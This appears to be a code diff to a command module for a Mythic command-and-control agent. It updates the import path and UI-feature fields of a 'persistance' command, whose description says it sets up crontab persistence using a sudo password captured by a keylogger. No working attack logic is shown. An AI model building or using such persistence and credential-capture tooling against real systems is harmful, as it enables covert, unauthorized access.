@@ -1,4 +1,4 @@
-from CommandBase import *
+from mythic_payloadtype_container.MythicCommandBase import *
 import json
 
 
@@ -17,12 +17,7 @@ class PersistanceCommand(CommandBase):
     help_cmd = "persistance"
     description = "crontab persistance after getting sudo psw with the keylogger"
     version = 1
-    is_exit = False
-    is_file_browse = False
-    is_process_list = False
-    is_download_file = False
-    is_remove_file = False
-    is_upload_file = False
+    supported_ui_features = [""]
     author = "@Kayn93"
     argument_class = PersistanceArguments
     attackmapping = []
